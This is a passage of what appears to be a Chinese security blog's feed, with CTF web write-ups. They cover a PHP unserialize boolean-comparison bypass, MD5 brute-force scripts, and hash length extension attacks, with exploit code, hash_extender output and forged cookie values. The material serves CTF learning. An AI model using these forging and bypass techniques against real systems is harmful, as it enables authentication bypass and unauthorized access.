class="string">'???'</span>)&#123;</span><br><span class="line">print_r(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>代码意思是把 post 提交的 password 值经过”反序列化”得到一个数组，要求数组里的 user 和 pass 都等于某个值时就打印 flag。<br>但是我们不知道两处 ??? 到底是什么，因此无法考虑用 php 函数构造这样的值。<br>别忘了还有一个提示： “伟大的科学家 php 方言道：成也布尔，败也布尔” ，bool 类型的 true 跟任意字符串可以弱类型相等。因此我们可以构造 bool 类型的序列化数据 ，无论比较的值是什么，结果都为true。（a 代表 array，s代表 string，b 代表 bool，而数字代表个数/长度）</p><p>构造 password 值为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p><p>在密码栏中提交构造的值，即可获取 flag: ctf{dwduwkhduw5465}</p><p><img src="4_4.png" alt></p><p><img src="4_5.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5 爆破问题</title>
      <link href="/2017/12/24/MD5%E7%88%86%E7%A0%B4%E9%97%AE%E9%A2%98/"/>
      <url>/2017/12/24/MD5%E7%88%86%E7%A0%B4%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>几道 MD5 爆破问题</p><a id="more"></a><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>md5多一位</p><p><img src="1_1.png" alt></p><p>代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mymd5=<span class="string">"d78b6f302l25cdc811adfe8d4e7c9fd34"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(33):</span><br><span class="line">    newmd5=mymd5[:i]+mymd5[i+1:]</span><br><span class="line">    <span class="built_in">print</span> newmd5</span><br></pre></td></tr></table></figure></p><p>难道是逐个解密？？</p><p>不对。</p><p>MD5 包含0-9a-f共16个字符，不存在 l </p><p>很明显应该去掉 l </p><p>对 “d78b6f30225cdc811adfe8d4e7c9fd34” 进行解密即可。</p><p><img src="1_2.png" alt></p><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p>代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">def <span class="built_in">test</span>():</span><br><span class="line">    count=0</span><br><span class="line">    md5=<span class="string">'38e4c352809e150186920aac37190cbc'</span></span><br><span class="line">    str=<span class="string">'flag&#123;www_shiyanbar_com_is_very_good_'</span></span><br><span class="line">    <span class="keyword">while</span> count==0:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">            a=chr(i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                b=chr(i)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                    c=chr(i)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                        d=chr(i)</span><br><span class="line">                        <span class="built_in">test</span>=str+a+b+c+d+<span class="string">'&#125;'</span></span><br><span class="line">                        m=hashlib.md5()</span><br><span class="line">                        m.update(<span class="built_in">test</span>)</span><br><span class="line">                        m=m.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span>(cmp(m,md5)==0):</span><br><span class="line">                             count=1</span><br><span class="line">                             <span class="built_in">print</span> <span class="string">'ok'</span></span><br><span class="line">                             <span class="built_in">print</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">test</span>()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure></p><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p>md5加盐爆破</p><p>题目：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have found a passwd file containing salted passwords. An unprotected configuration file has revealed a salt of 5948. The hashed password <span class="keyword">for</span> the <span class="string">'admin'</span> user appears to be 81bdf501ef206ae7d3b92070196f7e98, try to brute force this password.</span><br></pre></td></tr></table></figure></p><p>python 脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf -*-</span></span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    f=open(<span class="string">'1.txt'</span>,<span class="string">'rb'</span>).readlines()</span><br><span class="line">    salt=<span class="string">'5948'</span></span><br><span class="line">    m=<span class="string">'81bdf501ef206ae7d3b92070196f7e98'</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        t=line.strip()+salt</span><br><span class="line">        t=md5(t).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t==m:</span><br><span class="line">            <span class="built_in">print</span> line.strip()</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hash长度扩展攻击</title>
      <link href="/2017/12/23/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2017/12/23/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>hash 长度扩展攻击原理和实例</p><a id="more"></a><h1 id="sha1-的-hash-原理"><a href="#sha1-的-hash-原理" class="headerlink" title="sha1 的 hash 原理"></a>sha1 的 hash 原理</h1><p>谈一下对 sha1 加密的理解。</p><p><img src="1.jpeg" alt></p><p>首先，当 hash 函数拿到需要被 hash 的字符串后，先将其字节长度整除 64，取得余数。如果该余数正好等于 56，那么就在该字符串最后添加上 8 个字节的长度描述符（具体用bit表示）。如果不等于 56，就先对字符串进行长度填充，填充时第一个字节为 hex(80)，其他字节均用 hex(00) 填充，填充至余数为 56 后，同样增加 8 个字节的长度描述符（该长度描述符为需要被 hash 的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。</p><p>补位完成后，字符串以 64 位一组进行分组（因为上面的余数为 56,加上 8 个字节的长度描述符后，正好是 64 位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的 registers 值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的 registers 值就是最后的 hash 值。</p><p>在 sha1 的运算过程中，为确保同一个字符串的 sha1 值唯一，所以需要保证第一次 registers 的值也唯一。所以在 sha1 算法中，registers 具有初始值（固定的）。如上图中的 registers 值 0。<br>Hash 值的随机性完全依赖于进行 “复杂的数学变化” 时输入的 registers 值和该次运算中字符串分组的数据。如果进行 “复杂数学变化” 时输入的 registers 值和该次运算的字符串分组相同，那么他们各自生成的新的 registers 值也相同。</p><h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>当需要被 hash 的字符串为 str_a = “123456”，程序首先判断，len(str_a) % 64 == 56 是否成立。这里很明显不成立。那么程序就进行补位操作。首先补位成余数为 56 的长度。</p><p><img src="2.jpeg" alt></p><p>如上图，蓝色字体就为程序对该字符串进行补位的数据。当满足 len(str_a) % 64 == 56 后，程序就在该字符串的后面添加 8 个字节的长度描述符。注意，此处的长度为原始需要被 hash 的长度。也就是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len(str_a) = 6 字节 *8bit/字节 = 48bit = 0x30bit。</span><br></pre></td></tr></table></figure></p><p><img src="3.jpeg" alt></p><p>补位+长度描述符 = 64 个字节，正好是一个分组。所以此处只要进行一次复杂的数学变化就可以了。程序根据该 64 个字节的数据和 registers 值 0 生成新的 registers 值 1。那么该新的 registers 值 1 就是 str_a 的 sha1 值。</p><h2 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h2><p>讲了这么多，好像都没讲到如何利用该扩展攻击。那么下面，重点来了。</p><p>简单来说，就是服务器上会生成一个 salt 值，该 salt 值你是不可预测的。但是你又知道了 sha1(salt+filename)的值，该 filename 的值你也是知道的。假设此处的 filename 的值 report.pdf，最后 sha1 的值为：0a8d538b724c6f2b4288526eb540ee7c。为了方便理解，我们继续假设 salt 的长度为 16 位。</p><p><img src="4.jpeg" alt></p><p>将上图的字符串进行 sha1 操作时，同样先进行整除，然后取余。最后再补上 8 位的长度描述符。补位+添加长度描述符后的字符串如下图：</p><p><img src="5.jpeg" alt></p><p>该长度也就满足了 64 位的分组，只需要进行一次 “复杂的数学运算” 就可以得到最后的sha1值了。<br>下面请各位看官思考如何进行下面一个字符串的 sha1 操作。</p><p><img src="6.jpeg" alt></p><p>同样，还是先进行分组。由于该字符串的长度大于 64 个字节，且小于 128 个字节，所以要分成两组，需要进行两次“复杂的数学运算”。这个时候我们发现，第一个分组的数据和上图中补码后的数据完全一样，又因为他们都是第一个分组，初始的 registers 值也一样。那么经过第一轮“复杂的数学运算”，他们各自生成的 registers 值也同样是相同的。唯一不同的是，由于上面的长度小于 64 字节，所以只需要进行一轮运算便得到了最后的 sha1 值。然后这里的字符串有两个分组，需要将第一轮更新的 registers 值（也就是第一轮运算出来的 sha1 值）作为第二轮“复杂的数学运算”的 registers 值，然后才能得出最终的 sha1 值。</p><p>根据上面例子就说明，如果 salt 的值你不知道，但是你知道长度，又知道 sha1(salt)，那么就也就可以知道 sha1(salt+“填充数据”+“任意可控数据”).这里的 salt+“填充数据”就是对 salt 进行 sha1 时所补全的数据+最后8位的长度描述符。一般来说，salt+”填充数据”的长度就是64字节，正好是一个分组。如果 salt 的长度就大于了56个字节，那么加入填充数据后的长度应该是N个64字节，等于 N 个分组。如果最后一块长度大于 56 或等于 64 时一直填充到多出一个块并且该块长度为 56 字节。<br>为什么？你可以想象，sha1 程序再对（salt+“填充数据”+“任意可控数据”）进行 hash 时，只需要进行第二轮及第二轮以后的运算。因为第一轮运算后的 registers 值就是 sha1(salt)的值，该值你已经知道了。</p><p>PS : MD5、SHA-1、SHA-2 类似</p><h1 id="hash-长度扩展攻击实例"><a href="#hash-长度扩展攻击实例" class="headerlink" title="hash 长度扩展攻击实例"></a>hash 长度扩展攻击实例</h1><h2 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h2><p><img src="1.png" alt></p><p><img src="2.png" alt></p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><p>源码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">samplehash='</span>571580b26c65f306376d4f64e53cb5c7<span class="string">'</span></span><br><span class="line"><span class="string">s1='</span>0x<span class="string">'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]</span></span><br><span class="line"><span class="string">s2='</span>0x<span class="string">'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]</span></span><br><span class="line"><span class="string">s3='</span>0x<span class="string">'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]</span></span><br><span class="line"><span class="string">s4='</span>0x<span class="string">'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]</span></span><br><span class="line"><span class="string">print s1,'</span>\n<span class="string">',s2,'</span>\n<span class="string">',s3,'</span>\n<span class="string">',s4</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line">import my_md5</span><br><span class="line"><span class="comment">#reference:</span></span><br><span class="line"><span class="comment">#   http://www.freebuf.com/articles/web/69264.html</span></span><br><span class="line"><span class="comment">#problem link:</span></span><br><span class="line"><span class="comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span></span><br><span class="line"></span><br><span class="line">samplehash=<span class="string">"571580b26c65f306376d4f64e53cb5c7"</span></span><br><span class="line"><span class="comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span></span><br><span class="line">s1=0xb2801557</span><br><span class="line">s2=0x06f3656c</span><br><span class="line">s3=0x644f6d37</span><br><span class="line">s4=0xc7b53ce5</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(s1)</span><br></pre></td></tr></table></figure></p><p>exp：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="string">"a"</span>*15</span><br><span class="line">secret_admin = secret+<span class="string">'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'</span></span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br></pre></td></tr></table></figure></p><p>burp抓包改包：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=admin+\x80\x00……admin</span><br><span class="line">\x80\x00要在hex里面修改</span><br></pre></td></tr></table></figure></p><p><img src="5.png" alt></p><p><img src="6.png" alt></p><h2 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h2><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$SECRET</span>=<span class="string">"234098761"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="literal">false</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="literal">true</span>).<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$auth</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>]);  //先给<span class="variable">$auth</span>赋一个真值</span><br><span class="line">        <span class="variable">$hsh</span>=<span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$hsh</span> !== <span class="built_in">hash</span>(<span class="string">"sha256"</span>,<span class="variable">$SECRET</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"auth"</span>])))</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"hsh is error! &lt;br /&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$s</span>=serialize(<span class="variable">$auth</span>);</span><br><span class="line">        setcookie(<span class="string">"auth"</span>,<span class="variable">$s</span>);</span><br><span class="line">        setcookie(<span class="string">"hsh"</span>,<span class="built_in">hash</span>(<span class="string">"sha256"</span>,<span class="variable">$SECRET</span>.strrev(<span class="variable">$s</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"succusel &lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"fails &lt;br /&gt;"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析：<br>strrev()  反转字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ./hash_extender -f sha256 -l 9 -d <span class="string">';0:b'</span> -s feab615a09e9c09c1c79e806337bf73450786f1026ef88cf23a0c775b9c28391 -a <span class="string">';1:b'</span> --out-data-format=html  </span><br><span class="line"></span><br><span class="line">Type: sha256  </span><br><span class="line">Secret length: 9  </span><br><span class="line">New signature: 4cd85bfa32cfded3b01ed2a18af281c7dfd8118fdb3ce2d0d729f48fecbb1560  </span><br><span class="line">New string: %3b0%3ab%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00h%3b1%3ab</span><br></pre></td></tr></table></figure></p><p>从上面算得的值hash值是 sha256(key || padding || append) append的值是true的值。将cookie中的hsh换成上面的生成的新hash,再把上面的string逆序下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b%3a1%3bh%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b</span><br></pre></td></tr></table></figure></p><p>用上面的字符串修改auth的cookie值，再访问此网页就会认证成功了：</p><p><img src="7.png" alt></p><h2 id="实例3"><a href="#实例3" class="headerlink" title="实例3"></a>实例3</h2><p>secret长度不知道暴力攻击</p><p>题目：flag在管理员手里</p><p><img src="3_1.png" alt></p><p><img src="3_2.png" alt></p><p>用御剑 1.5 扫描 找到 index.php~  打开都是乱码<br>拷贝至 linux 虚拟机名字改成 .index.php.swp<br>vim -r index.php  保存即可</p><p>得到的代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">body &#123;</span><br><span class="line">background:gray;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$role</span> = <span class="string">"guest"</span>;</span><br><span class="line"><span class="variable">$salt</span> = </span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>])) &#123;</span><br><span class="line"><span class="variable">$role</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]);</span><br><span class="line"><span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">"hsh"</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">"admin"</span> &amp;&amp; <span class="variable">$hsh</span> === md5(<span class="variable">$salt</span>.strrev(<span class="variable">$_COOKIE</span>[<span class="string">"role"</span>]))) &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$role</span>);</span><br><span class="line">setcookie(<span class="string">'role'</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$hsh</span> = md5(<span class="variable">$salt</span>.strrev(<span class="variable">$s</span>));</span><br><span class="line">setcookie(<span class="string">'hsh'</span>,<span class="variable">$hsh</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p><p>很明显secret长度不知道，只能通过爆破</p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from urlparse import urlparse</span><br><span class="line">from httplib import HTTPConnection</span><br><span class="line">from urllib import urlencode</span><br><span class="line">import 